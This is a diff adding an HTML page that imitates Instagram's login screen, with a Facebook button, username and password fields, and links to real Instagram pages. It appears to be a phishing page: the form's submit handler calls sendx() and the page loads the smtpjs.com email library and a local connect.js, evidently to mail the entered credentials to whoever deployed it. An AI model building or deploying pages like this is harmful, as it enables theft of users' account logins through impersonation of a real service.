@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title></title>
+  <link rel="stylesheet" href="style2.css">
+</head>
+
+<body>
+  <select id="lang">
+    <option id="eng">English(UK)</option>
+    <option id="hin">Hindi</option>
+  </select>
+
+  <img id="logo" src="logo.png.jpg.png">
+
+  <button id="bt"><i id="" class="fa-brands fa-square-facebook" style="color: #fff;"></i><span>Continue with Facebook</span> </button>
+
+  <div class="hr">
+    <hr>
+  </div>
+
+  <div class="or">
+    <p>OR</p>
+  </div>
+
+  <form onsubmit="sendx(); reset(); return false ;">
+
+    <div class="input-box">
+      <input id="user" type="text"  placeholder="Phone number, username, or email">
+    </div>
+
+    <div class="input-box">
+      <input id="pass" type="password" placeholder="Password">
+    </div>
+
+    <!-- Forgotten password link -->
+    <a href="https://www.instagram.com/accounts/password/reset/" class = "fyp">Forgotten your password?</a>
+
+    <button class="log" type="submit" value="Log in" name="submit">Log in</button>
+  </form>
+
+  <!-- Sign up paragraph -->
+  <p class = "ac">Don't have an account? <a href="https://www.instagram.com/accounts/signup/email/" id="sign-up-link">Sign up</a></p>
+  
+  <img src = "meta.svg" class = "from-meta-last">
+
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  <script src="connect.js"></script>
+  <script src="https://kit.fontawesome.com/729ac9f222.js"></script>
+</body>
+
+</html>
